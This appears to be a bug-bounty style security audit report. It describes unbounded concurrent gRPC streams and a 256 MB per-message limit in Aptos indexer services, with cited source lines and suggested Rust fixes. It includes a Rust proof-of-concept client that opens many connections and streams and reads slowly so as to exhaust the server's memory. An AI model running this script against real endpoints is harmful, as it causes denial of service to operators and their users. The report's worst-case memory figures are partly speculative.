# Audit Report

## Title
Memory Exhaustion via Unbounded Concurrent gRPC Streams in Indexer Services

## Summary
The `MAX_MESSAGE_SIZE` constant (256 MB) in the indexer-grpc services is applied per-message, not globally. With no concurrent connection or stream limits, an attacker can open multiple connections with multiple HTTP/2 streams each, causing unbounded memory consumption and service crashes.

## Finding Description

The indexer-grpc services configure a `MAX_MESSAGE_SIZE` of 256 MB that is applied to individual gRPC messages via tonic's `max_decoding_message_size()` and `max_encoding_message_size()` methods. [1](#0-0) 

This limit is applied per-message when configuring the gRPC server: [2](#0-1) 

And similarly for gRPC clients: [3](#0-2) [4](#0-3) 

**The Critical Issue**: The codebase has **no concurrent connection limits** or **HTTP/2 stream limits**. The `ConnectionManager` tracks active streams for monitoring purposes but does not enforce any limits: [5](#0-4) 

An attacker can exploit this by:
1. Opening N concurrent connections to the gRPC server
2. Each HTTP/2 connection supports M concurrent streams (typically 100-250 by default)
3. Each stream can have messages up to 256 MB in flight
4. **Total potential memory consumption: N × M × 256 MB**

With just 10 connections and 100 streams per connection, this equals **256 GB** of memory consumption, far exceeding typical node resources.

The HTTP/2 keepalive configuration does not prevent this attack: [6](#0-5) 

These settings only help garbage collect dead connections after they're idle, but don't prevent new connections or limit concurrent streams.

## Impact Explanation

This vulnerability qualifies as **High Severity** per the Aptos bug bounty program:

- **Validator node slowdowns**: Indexer services often run on the same machines as fullnodes/validators. Memory exhaustion can cause system-wide slowdowns affecting consensus participation.

- **API crashes**: The indexer gRPC services will crash under memory pressure, causing denial of service for indexer clients and blockchain explorers.

The attack breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits." There are no limits on memory consumption from concurrent connections.

## Likelihood Explanation

**Likelihood: High**

- Attack complexity: Low - requires only a standard gRPC client
- Attacker requirements: None - public endpoints accept anonymous connections
- Detection difficulty: Medium - may appear as legitimate high load initially
- Cost to attacker: Minimal - just network bandwidth

The attack is trivially exploitable with standard gRPC tooling. An attacker can use any gRPC client library to open multiple concurrent streams and send large messages.

## Recommendation

Implement multiple layers of protection:

1. **Add concurrent stream limits** at the HTTP/2 layer:
```rust
Server::builder()
    .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
    .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
    .initial_stream_window_size(Some(1 << 20))  // 1 MB per stream
    .initial_connection_window_size(Some(10 << 20))  // 10 MB per connection
    .max_concurrent_streams(Some(10))  // Limit streams per connection
```

2. **Enforce connection limits** in the `ConnectionManager`:
```rust
const MAX_CONCURRENT_STREAMS: usize = 1000;  // Global limit

impl ConnectionManager {
    pub(crate) fn insert_active_stream(&self, ...) -> Result<(), Status> {
        if self.active_streams.len() >= MAX_CONCURRENT_STREAMS {
            return Err(Status::resource_exhausted("Too many concurrent streams"));
        }
        // ... existing code
    }
}
```

3. **Reduce MAX_MESSAGE_SIZE** to a more reasonable value (e.g., 10-20 MB) to match the actual batch size: [7](#0-6) 

The actual batch size is only 20 MB, so 256 MB is unnecessarily large.

## Proof of Concept

```rust
// PoC: Memory exhaustion attack on indexer-grpc service
use aptos_protos::indexer::v1::{
    raw_data_client::RawDataClient, GetTransactionsRequest
};
use tonic::transport::Channel;
use futures::stream::StreamExt;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let target = "http://indexer-grpc-service:50051";
    
    // Attack parameters
    let num_connections = 20;
    let streams_per_connection = 50;
    
    println!("Starting memory exhaustion attack...");
    println!("Target: {} connections × {} streams = {} total streams", 
             num_connections, streams_per_connection, 
             num_connections * streams_per_connection);
    println!("Potential memory: {} × 256 MB = {} GB",
             num_connections * streams_per_connection,
             num_connections * streams_per_connection * 256 / 1024);
    
    let mut handles = vec![];
    
    // Open multiple connections
    for conn_id in 0..num_connections {
        let target = target.to_string();
        
        handles.push(tokio::spawn(async move {
            // Create client connection
            let channel = Channel::from_shared(target)
                .unwrap()
                .connect()
                .await
                .unwrap();
            
            // Open multiple concurrent streams on this connection
            let mut stream_handles = vec![];
            for stream_id in 0..streams_per_connection {
                let mut client = RawDataClient::new(channel.clone());
                
                stream_handles.push(tokio::spawn(async move {
                    // Request large batches to trigger 256 MB message allocations
                    let request = GetTransactionsRequest {
                        starting_version: Some(0),
                        transactions_count: Some(1_000_000), // Request huge batch
                        batch_size: Some(100_000), // Large batch size
                        transaction_filter: None,
                    };
                    
                    // Open stream and slowly consume to keep memory allocated
                    match client.get_transactions(request).await {
                        Ok(response) => {
                            let mut stream = response.into_inner();
                            while let Some(_item) = stream.next().await {
                                // Slowly consume to keep connection alive
                                tokio::time::sleep(tokio::time::Duration::from_secs(10)).await;
                            }
                        }
                        Err(e) => eprintln!("Connection {}-{} failed: {}", conn_id, stream_id, e),
                    }
                }));
            }
            
            // Wait for all streams on this connection
            futures::future::join_all(stream_handles).await;
        }));
    }
    
    // Wait for all connections
    futures::future::join_all(handles).await;
    
    Ok(())
}
```

**Expected Result**: The indexer-grpc service will experience severe memory pressure and likely crash due to out-of-memory conditions as it attempts to buffer messages from all concurrent streams. System monitoring will show memory usage climbing to exhaust available RAM.

**Notes**

This vulnerability affects all indexer-grpc services in the Aptos ecosystem:
- `indexer-grpc-manager` 
- `indexer-grpc-data-service-v2`
- `indexer-grpc-fullnode`

While these services are not directly part of the consensus protocol, they often run on the same infrastructure as validators and fullnodes. Memory exhaustion on the host machine will degrade validator performance and can cause consensus participation issues, qualifying this as High severity.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/config.rs (L15-15)
```rust
pub(crate) const MAX_MESSAGE_SIZE: usize = 256 * (1 << 20);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/grpc_manager.rs (L99-100)
```rust
        .max_encoding_message_size(MAX_MESSAGE_SIZE)
        .max_decoding_message_size(MAX_MESSAGE_SIZE);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L52-53)
```rust
            .max_encoding_message_size(MAX_MESSAGE_SIZE)
            .max_decoding_message_size(MAX_MESSAGE_SIZE);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L36-37)
```rust
const HTTP2_PING_INTERVAL_DURATION: std::time::Duration = std::time::Duration::from_secs(60);
const HTTP2_PING_TIMEOUT_DURATION: std::time::Duration = std::time::Duration::from_secs(10);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L240-241)
```rust
                .max_decoding_message_size(MAX_MESSAGE_SIZE)
                .max_encoding_message_size(MAX_MESSAGE_SIZE);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/connection_manager.rs (L190-215)
```rust
    pub(crate) fn insert_active_stream(
        &self,
        id: &str,
        start_version: u64,
        end_version: Option<u64>,
    ) {
        self.active_streams.insert(
            id.to_owned(),
            (
                ActiveStream {
                    id: id.to_owned(),
                    start_time: Some(timestamp_now_proto()),
                    start_version,
                    end_version,
                    progress: None,
                },
                StreamProgressSamples::new(),
            ),
        );
        let label = if self.is_live_data_service {
            ["live_data_service"]
        } else {
            ["historical_data_service"]
        };
        NUM_CONNECTED_STREAMS.with_label_values(&label).inc();
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/mod.rs (L28-28)
```rust
const MAX_BYTES_PER_BATCH: usize = 20 * (1 << 20);
```
